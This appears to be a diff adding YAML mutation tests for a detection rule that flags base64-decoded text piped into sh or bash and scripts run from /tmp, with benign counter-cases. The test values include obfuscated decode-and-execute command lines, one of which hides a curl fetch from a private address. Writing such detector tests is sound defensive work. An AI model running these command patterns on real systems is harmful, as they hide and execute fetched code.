@@ -1,0 +1,38 @@
+# yaml-language-server: $schema=../../../../schemas/mutation.schema.json
+mutations:
+- name: decode_pipe_without_spaces
+  description: No spaces around the pipe
+  base: 1
+  set:
+    CommandLine: sh -c echo ZWNobyByYXNkXzFhMmIzYzRk|base64 -d|sh
+  should_match: true
+- name: decode_into_bash_by_full_path
+  description: The decoded text piped into /bin/bash
+  base: 3
+  set:
+    CommandLine: bash -c echo Y3VybCBodHRwOi8vMTAuMC4wLjUvYQ== | base64 -d | /bin/bash
+  should_match: true
+- name: decode_flags_combined
+  description: -di (decode, ignore garbage) as some droppers write it
+  base: 1
+  set:
+    CommandLine: sh -c echo ZWNobyByYXNkXzFhMmIzYzRk | base64 -di | sh
+  should_match: true
+- name: quoted_script_path_in_tmp
+  description: The script path quoted
+  base: 8
+  set:
+    CommandLine: bash "/tmp/install.sh"
+  should_match: true
+- name: decode_into_a_file_is_benign
+  description: Decoding into a file and stopping there
+  base: 1
+  set:
+    CommandLine: sh -c echo ZWNobyByYXNkXzFhMmIzYzRk | base64 -d > out.txt
+  should_match: false
+- name: script_in_home_is_benign
+  description: The same shell running a script from a home directory
+  base: 8
+  set:
+    CommandLine: bash /home/labuser/install.sh
+  should_match: false
